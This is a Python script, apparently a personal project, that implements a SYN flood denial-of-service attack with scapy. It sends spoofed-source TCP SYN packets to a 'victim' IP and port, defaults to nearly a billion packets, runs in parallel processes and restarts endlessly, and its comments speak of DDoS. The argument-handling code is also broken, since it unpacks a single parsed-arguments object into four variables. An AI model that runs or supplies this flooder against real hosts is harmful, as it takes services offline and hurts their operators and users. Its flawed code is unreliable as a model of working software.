#!/usr/bin/env python3
import argparse
import random
from scapy.all import send, IP as ScapyIP, TCP
# Testing to create many processes
import multiprocessing
import os


# Default number of packets
DEFAULT_PACK = 999999999
# Total of Ports an OS can hold
MAX_PORTS = 65535
DEFAULT_PORT = 8082
DEFAULT_PROCESS = 1

#Target_IP = input('Enter target IP [192.168.2.240]: ')
#dPort = input('Enter dst Port [8082]: ')

# Whole value can be concantenated
#dPort = int(dPort)
#packets_to_send = int(DEFAULT_PACK)

# Get generate random IP
def random_IP_addr():
    # range(4) => 192.168.0.1 = 4 ranges
    # "." = joining 192.168.x.y
    
    random_IP = ".".join(map(str, (random.randint(0,255) for _ in range(4))))
    return random_IP


def get_args():
    parser = argparse.ArgumentParser(description="Sync Flooder\n")
    # Allow users to entert -flag arguments like Traditional Linux tools
    # python3 flooder.py 192.168.2.65 -a 999999999 -p 8082
    
    # python3 flooder.py --host 192.168.2.240 --port 8082 --amount 999999999 --thread 10
    parser.add_argument('-host', '--host', required=True, help="Victim's IP Addr")
    parser.add_argument('-port', '--port', type=int, help="Target Port (default ports are 8080/8081/8082)", default=DEFAULT_PORT)
    parser.add_argument('-amount', '--amount', type=int, help="Amount of packets (default are infinitity)", default=DEFAULT_PACK)
    parser.add_argument('-thread', '--thread', type=int, help="Number of multi-processes", default=DEFAULT_PROCESS)
        
    return parser.parse_args()
    #args = parser.parse_args()
    
    # return h -p -a -t
    #return args.target, args.port, args.amount, args.process


def sync_flood():
    
    # Instantiate all required params before looping
    target, port, amount, process = get_args()
    
    #print("Sending packets to the target...")
    # As we know how many packets to send, use for loop
    
    
    
    for _ in range(amount):
    #while True:
        seq_n = random.randint(0, MAX_PORTS)
        # srcPort
        sPort = random.randint(0, MAX_PORTS)
        Window = random.randint(0, MAX_PORTS)
        
        # Calling back random IP returned from def random_IP_addr()
        src_ip = random_IP_addr()
        
        # Setting up packets
        # sport = Source Port
        # dport = Destination Port
        # seq = sequence ; seq_n = sequetial number
        packet = ScapyIP(dst=target, src=src_ip)/TCP(sport=sPort, dport=port, flags="S", seq=seq_n, window=Window)
        send(packet, verbose=0)
        
    #print("Sent all packets :D")
    #print(f'Sent all the packets {packet} from src_IP:sPort {src_IP}:{sPort} to Target_IP:dPort {Target_IP}:{dPort}')
           
    
def main():
    
    #input_processes = 10 # T
    # Counting all useable CPU
    my_cpu = multiprocessing.cpu_count()
    #print(f'my_cpu: {my_cpu}')

    # Create a list of jobs to run in parallel
    # jobs= [
    #     {'func': print_cube, 'args':(3,)},
    #     {'func': print_square, 'args': (4,)}
    # ]
            
    # Number of processes from users' terminal input
    process_input = DEFAULT_PROCESS
    
    # List to keep track of processes
    processes = [multiprocessing.Process(target=sync_flood) for _ in range(process_input)]

    # forEach process in processes
    for process in processes:
        process.start()
    
    # Joining each process to our thread pool
    for i, process in enumerate(processes):
        process.join()
        print(f'Process i is alive?\n{ process.is_alive()}')
    
    # **** Multi-callbacks :D
    # Loop over the Jobs & create a process for each one
    # for i in range(number_of_processes):
    #     p = multiprocessing.Process(
    #         target=job['func'], 
    #         args=job['args']
    #         )
    
    
    # ****** Single Callback for DDoS :D
    # for i in range(number_of_processes):
        
    #     # Creating each process p
    #     p = multiprocessing.Process(target=do_flood, args=())

    #     # Appending each p in multiprocessing.Process()
    #     # to List processes = []
    #     processes.append(p)
        
    #     # Start each Process p
    #     p.start()
    
    # Wait for all processes to complete
    # Loop through each process in List processes
    # then wait for each process to complete
    # by joining each single process p
    
    # for process in processes:
    #     process.join()
        
    # Check whether processes are still alive
    #for i, process in enumerate(processes, start=1):
    
    # for i, process in enumerate(process):
    #     p.join()
    #     print(f'Process i is alive?\n{p.is_alive()}')
        
    
# Fucking Windows checks for whether this is the main script
# and NOT a module...    
if __name__ == '__main__':
    while True:
        main()
    